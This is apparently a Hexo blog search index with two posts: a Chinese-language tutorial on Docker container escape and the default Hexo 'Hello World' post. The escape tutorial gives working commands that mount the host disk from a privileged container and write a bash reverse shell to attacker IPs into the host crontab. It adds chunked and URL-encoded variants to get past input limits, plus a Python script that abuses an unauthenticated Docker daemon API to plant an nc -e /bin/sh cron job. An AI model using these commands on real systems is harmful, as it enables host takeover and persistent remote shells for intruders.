<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>docker逃逸</title>
      <link href="2021/04/19/docker%E9%80%83%E9%80%B8/"/>
      <url>2021/04/19/docker%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="使用特权模式启动容器的docker逃逸方法"><a href="#使用特权模式启动容器的docker逃逸方法" class="headerlink" title="使用特权模式启动容器的docker逃逸方法"></a>使用特权模式启动容器的docker逃逸方法</h1><p>使用特权模式启动镜像</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --privileged 2c047404e52d /bin/bash</span><br></pre></td></tr></table></figure><p>考虑到部署环境时大多使用vulhub的镜像，所以这里给出修正方案是在docker-compose.yml文件中添加一个字段，如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privileged: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210106133232264.png" alt="image-20210106133232264"></p><p>修改完成后执行如下命令启动：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>通过漏洞利用拿到docker 容器的shell后：</p><p>查看磁盘文件：fdisk -l</p><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210106102824909.png" alt="image-20210106102824909"></p><p> 从返回结果来看sda1、sda2、sda5在/dev目录下。 </p><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210106102909850.png" alt="image-20210106102909850"></p><p>新建一个目录/test，将/dev/sda5挂载到新建的目录下，并查看test目录下的内容，发现可以访问宿主机上/目录下的内容了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ./<span class="built_in">test</span></span><br><span class="line">mount /dev/sda5 ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210106103015017.png" alt="image-20210106103015017"> </p><p>将反弹shell的命令写成一个脚本crontabshell存在/tmp下面</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建shell脚本文件</span></span><br><span class="line">touch ./<span class="built_in">test</span>/tmp/crontabshell</span><br><span class="line"><span class="comment">#写入反弹shell命令</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#!/bin/bash&quot;</span> &gt; ./<span class="built_in">test</span>/tmp/crontabshell</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.20.133/8888 0&gt;&amp;1 &amp;&quot;</span> &gt;&gt; ./<span class="built_in">test</span>/tmp/crontabshell</span><br><span class="line"><span class="comment">#添加执行权限</span></span><br><span class="line">chmod 755 ./<span class="built_in">test</span>/tmp/crontabshell</span><br></pre></td></tr></table></figure><p><strong>==可能遇到的问题==</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">当命令执行有长度限制时，解决办法如下：</span></span><br><span class="line">echo &quot;#!/bin/bash&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;bash -i &quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;bash -i &quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;&gt;&amp; /dev/&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;tcp/192.&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;168.137.&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot;235/7777&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line">echo -n &quot; 0&gt;&amp;1 &amp;&quot; &gt;&gt; ./test/tmp/crontabshell</span><br><span class="line"><span class="meta">#</span><span class="bash">如果遇到&amp; &gt;等特殊符号写不进去可以尝试编码之后再写，如下：</span></span><br><span class="line">touch ./test/tmp/crontabshell</span><br><span class="line">echo &quot;#!/bin/bash&quot; &gt; ./test/tmp/crontabshell</span><br><span class="line">echo &quot;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.137.235%2F7777%200%3E%261%20%26&quot; &gt;&gt; ./test/tmp/crontabshell</span><br></pre></td></tr></table></figure><p>在系统计划任务里写入执行脚本的定时任务：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*/1 * * * * root /tmp/crontabshell&quot;</span> &gt;&gt; ./<span class="built_in">test</span>/etc/crontab</span><br><span class="line"><span class="comment">#编码结果如下：</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*%2F1%20*%20*%20*%20*%20root%20%2Ftmp%2Fcrontabshell&quot;</span> &gt;&gt; ./<span class="built_in">test</span>/etc/crontab</span><br></pre></td></tr></table></figure><p>在攻击机上开启netcat监听7777端口，成功接收到宿主主机的Shell，实现Docker逃逸。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210106185232646.png" alt="image-20210106185232646"></p><h1 id="docker-daemon-api-未授权访问"><a href="#docker-daemon-api-未授权访问" class="headerlink" title="docker daemon api 未授权访问"></a>docker daemon api 未授权访问</h1><p>访问your-ip:2375/version验证是否搭建成功</p><p><img src="docker%E9%80%83%E9%80%B8.assets/image-20210107154914903.png" alt="image-20210107154914903"></p><p>利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">&#x27;http://192.168.11.160:2375/&#x27;</span>)</span><br><span class="line">data = client.containers.run(<span class="string">&#x27;alpine:latest&#x27;</span>, <span class="string">r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;*/1 * * * * /usr/bin/nc 192.168.11.1 21 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;</span>, remove=<span class="literal">True</span>, volumes=&#123;<span class="string">&#x27;/etc&#x27;</span>: &#123;<span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/etc&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2021/04/19/hello-world/"/>
      <url>2021/04/19/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
